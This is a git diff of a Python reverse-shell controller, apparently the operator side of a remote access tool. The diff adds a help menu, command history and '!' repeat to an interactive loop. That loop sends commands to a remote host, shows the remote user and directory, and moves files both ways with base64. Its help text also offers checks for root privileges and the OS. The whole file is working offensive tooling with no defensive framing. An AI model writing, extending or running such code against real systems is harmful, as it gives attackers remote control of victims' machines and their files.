@@ -1,9 +1,18 @@
 #!/usr/bin/python3
 
-import socket, sys, os, argparse, json, base64, random, string
+import socket
+import sys
+import os
+import argparse
+import json
+import base64
+import random
+import string
 from datetime import datetime
 
 ENCODING = "utf-8"
+
+COMMANDS = []
 
 def generate_random():
   ct = datetime.today().strftime('%Y%m%d%H%M%S')
@@ -49,47 +58,92 @@ def pwd():
 def str_to_bytes(string):
   return str(string).encode(ENCODING)
 
+def help():
+  help_text = """
+  --- BASIC ---
+  cd        Change your current working directory
+  download  Download a specific file from the remote file system
+  upload    Upload a specific file to the remote file system
+  admin     Check if the remote shell is running with ROOT privileges
+  os        Check the remote system OS details
+  hist      Check command history. You can use the exclamation mark ! to repeat a command.
+
+  --- OTHER ---
+  You may run any other commands according to the specific OS.
+  """
+
+  print(help_text)
+
+def history():
+  for i, c in enumerate(COMMANDS):
+    print(i, c)
+
+def history_cmd(idx):
+  try:
+    return COMMANDS[int(idx)]
+  except:
+    print("[-] No such command history")
+    return None
+
 def shell():
   global target
   global raddr
-  global rport  
+  global rport
+  global COMMANDS
 
   while True:
     try:
-        current_user = whoami()
-        current_dir = pwd()
+      cmd = ""
+      current_user = whoami()
+      current_dir = pwd()
 
-        cmd = input("%s@%s:%d:%s~$ " % (current_user, raddr, rport, current_dir))
-        reliable_send(cmd)
+      cmd = input("%s@%s:%d:%s~$ " % (current_user, raddr, rport, current_dir))
 
-        if cmd == "exit":
-            print("[*] Exited.")
-            break
+      if cmd == "help":
+        help()
+        continue
+      elif cmd == "hist":
+        history()
+        continue
 
-        tmp_cmd = cmd.split(" ")
+      if cmd[0] == "!":
+        tmp_idx_cmd = cmd.split("!")[1]
+        cmd = history_cmd(tmp_idx_cmd)
+        if cmd == None:
+          continue
+        print("[+] Running:", cmd)
 
-        if tmp_cmd[0] == "download" and tmp_cmd[1] != "":
-          try:
-            print("Downloading file \"%s\"" % tmp_cmd[1])
-            with open(tmp_cmd[1], "rb") as f:
-              data = base64.b64encode(f.read()).decode(ENCODING)
-              reliable_send(data)
-          except Exception as e:
-            reliable_send(str_to_bytes(e))
-        elif tmp_cmd[0] == "upload" and tmp_cmd[1] != "":
-          try:
-            tmp_ext = get_extension(tmp_cmd[1])
-            tmp_fname = generate_random() + tmp_ext
-            print("Uploading file \"%s\" as \"%s\"" % (tmp_cmd[1], tmp_fname))
-            with open(tmp_fname, "wb") as f:
-              data = reliable_recv()
-              f.write(base64.b64decode(data))
-          except Exception as e:
-            reliable_send(str_to_bytes(e))
+      COMMANDS.append(cmd)
+      reliable_send(cmd)
 
-        msg = reliable_recv().strip()
-        if msg != "":
-          print(msg)
+      if cmd == "exit":
+        print("[*] Exited.")
+        break
+
+      tmp_cmd = cmd.split(" ")
+ 
+      if tmp_cmd[0] == "download" and tmp_cmd[1] != "":
+        try:
+          print("Downloading file \"%s\"" % tmp_cmd[1])
+          with open(tmp_cmd[1], "rb") as f:
+            data = base64.b64encode(f.read()).decode(ENCODING)
+            reliable_send(data)
+        except Exception as e:
+          reliable_send(str_to_bytes(e))
+      elif tmp_cmd[0] == "upload" and tmp_cmd[1] != "":
+        try:
+          tmp_ext = get_extension(tmp_cmd[1])
+          tmp_fname = generate_random() + tmp_ext
+          print("Uploading file \"%s\" as \"%s\"" % (tmp_cmd[1], tmp_fname))
+          with open(tmp_fname, "wb") as f:
+            data = reliable_recv()
+            f.write(base64.b64decode(data))
+        except Exception as e:
+          reliable_send(str_to_bytes(e))
+
+      msg = reliable_recv().strip()
+      if msg != "":
+        print(msg)
     except KeyboardInterrupt:
       print("[*] Interrupted...")
       sys.exit(0)
